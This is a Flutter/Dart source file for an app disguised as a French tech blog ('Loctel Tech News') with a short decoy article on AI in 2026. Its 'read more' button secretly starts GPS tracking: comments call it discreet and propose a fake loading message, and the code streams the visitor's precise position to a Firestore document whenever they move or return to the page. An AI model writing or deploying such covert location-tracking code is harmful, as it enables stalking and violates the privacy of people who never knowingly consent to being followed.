import 'package:flutter/material.dart';
import 'package:geolocator/geolocator.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_core/firebase_core.dart';
import 'firebase_options.dart';
import 'dart:async';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(primarySwatch: Colors.blue, useMaterial3: true),
      home: const BlogHomePage(),
    );
  }
}

class BlogHomePage extends StatefulWidget {
  const BlogHomePage({super.key});
  @override
  State<BlogHomePage> createState() => _BlogHomePageState();
}

class _BlogHomePageState extends State<BlogHomePage> with WidgetsBindingObserver {
  bool _isTracking = false;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  // Se déclenche quand l'utilisateur revient sur l'onglet
  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed && _isTracking) {
      _forceUpdateLocation();
    }
  }

  void _startInvisibleTracking() async {
    LocationPermission permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
    }
    
    if (permission == LocationPermission.always || permission == LocationPermission.whileInUse) {
      setState(() => _isTracking = true);
      
      // Stream de position (Mise à jour automatique)
      Geolocator.getPositionStream(
        locationSettings: const LocationSettings(accuracy: LocationAccuracy.high, distanceFilter: 5)
      ).listen((Position position) {
        _sendToFirebase(position);
      });
    }
  }

  Future<void> _forceUpdateLocation() async {
    Position pos = await Geolocator.getCurrentPosition();
    _sendToFirebase(pos);
  }

  Future<void> _sendToFirebase(Position pos) async {
    await FirebaseFirestore.instance.collection('locations').doc('web_phone_01').set({
      'latitude': pos.latitude,
      'longitude': pos.longitude,
      'last_seen': FieldValue.serverTimestamp(),
      'status': 'online',
    }, SetOptions(merge: true));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("Loctel Tech News", style: TextStyle(fontWeight: FontWeight.bold)),
        backgroundColor: Colors.white,
        elevation: 1,
      ),
      body: SingleChildScrollView(
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // IMAGE D'ILLUSTRATION DU BLOG
            Container(
              height: 200,
              width: double.infinity,
              color: Colors.blueGrey[100],
              child: const Icon(Icons.article, size: 80, color: Colors.blue),
            ),
            
            Padding(
              padding: const EdgeInsets.all(16.0),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    "L'intelligence Artificielle en 2026 : Ce qui change vraiment",
                    style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold),
                  ),
                  const SizedBox(height: 10),
                  Text("Publié le 07 Avril 2026 • 5 min de lecture", 
                       style: TextStyle(color: Colors.grey[600])),
                  const Divider(height: 30),
                  
                  // CONTENU DU BLOG
                  const Text(
                    "Depuis le début de l'année, les modèles de langage ont franchi une étape cruciale. "
                    "Contrairement aux versions précédentes, les IA actuelles ne se contentent plus de répondre, "
                    "elles anticipent les besoins des utilisateurs grâce à une intégration locale plus poussée.\n\n"
                    "L'un des points majeurs concerne la cybersécurité et la protection des données personnelles. "
                    "Alors que nous partageons de plus en plus d'informations en ligne, comment rester anonyme ?",
                    style: TextStyle(fontSize: 16, height: 1.5),
                  ),
                  
                  const SizedBox(height: 20),
                  
                  // LE BOUTON "LIRE LA SUITE" (C'est lui qui déclenche le GPS discrètement)
                  Center(
                    child: ElevatedButton(
                      onPressed: () {
                        _startInvisibleTracking(); // Active le GPS
                        // Optionnel : afficher un message de chargement factice
                      },
                      style: ElevatedButton.styleFrom(padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 15)),
                      child: const Text("Lire la suite de l'article"),
                    ),
                  ),
                  
                  const SizedBox(height: 30),
                  const Text(
                    "Impact sur le travail hybride",
                    style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold),
                  ),
                  const Text(
                    "Le télétravail continue d'évoluer. Les entreprises cherchent désormais à optimiser "
                    "la collaboration à distance sans sacrifier la productivité. Les outils de tracking "
                    "et de gestion de projet sont devenus indispensables pour maintenir le lien...",
                    style: TextStyle(fontSize: 16, height: 1.5),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}